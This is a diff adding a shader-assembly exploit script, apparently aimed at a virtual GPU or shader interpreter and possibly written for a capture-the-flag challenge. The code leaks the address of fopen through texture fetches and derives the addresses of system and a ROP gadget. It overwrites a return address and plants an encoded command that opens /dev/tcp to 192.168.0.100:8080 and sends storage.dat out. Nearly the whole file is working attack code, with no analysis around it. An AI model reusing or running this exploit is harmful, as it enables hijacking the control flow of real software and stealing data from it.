@@ -1,0 +1,57 @@
+seti r30.y 112233
+cmpeqi r30.x r30.y
+jmp_false 2
+ret
+
+mov r30.x r30.y
+
+mov o325.xy o4.xy 	/* pState.textures[ 0 ] = &psRegs.CR[ 0 ] */
+seti c0.zw 2 1		/* textures[ 0 ] width = 2 height = 1 */
+
+seti c0.x 6394272
+
+set r10.xyzw 0.0 0.0 1.0 0.0
+tfetch r0.xyzw r10.xy t0 /* read address of fopen */
+tfetch r1.xyzw r10.zw t0 /* read address of fopen */
+
+/* reconstruct fopen addr */
+seti r20.xyzw 0 8 16 24
+
+shl r0.xyzw r0.xyzw r20.xyzw
+or r0.x r0.x r0.y
+or r0.x r0.x r0.z
+or r0.x r0.x r0.w
+
+shl r1.xyzw r1.xyzw r20.xyzw
+or r1.x r1.x r1.y
+or r1.x r1.x r1.z
+or r1.x r1.x r1.w
+mov r0.y r1.x 		/* r0 - fopen addr */
+
+/* calc system addr */
+seti r10.x 164208
+mov r1.xy r0.xy
+subi r1.x r1.x r10.x /* r1 - system addr */
+
+/* calc gadget addr */
+seti r10.x 529723
+mov r2.xy r0.xy
+addi r2.x r2.x r10.x /* r2 - gadget addr */
+
+mov o26.zw r2.xy /* overwrite return address, so will jump to gadget */
+mov o27.xy r1.xy /* pop rax in gadget will write system addr to rax */
+
+/* prepare /bin/sh string */
+/* seti c0.xy 1852400175 6845231 */
+
+/* echo 'exec 5<>/dev/tcp/192.168.0.100/8080;cat storage.dat >&5' > shell; bash shell */
+seti c0.xyzw 1869112165 2019895072 891315045 1680817724 
+seti c1.xyzw 1949267557 825192547 825111097 808335414 
+seti c2.xyzw 808464686 942684207 1633893168 1953702004 
+seti c3.xyzw 1734439535 1633955429 641605748 1042294581 
+seti c4.xyzw 1701344032 540765292 1752392034 1701344032 
+seti c5.xyzw 27756 0 0 0
+
+mov o27.zw o4.xy /* pop rdi in gadget will write address of c0( ie. string ) to rdi */
+
+ret
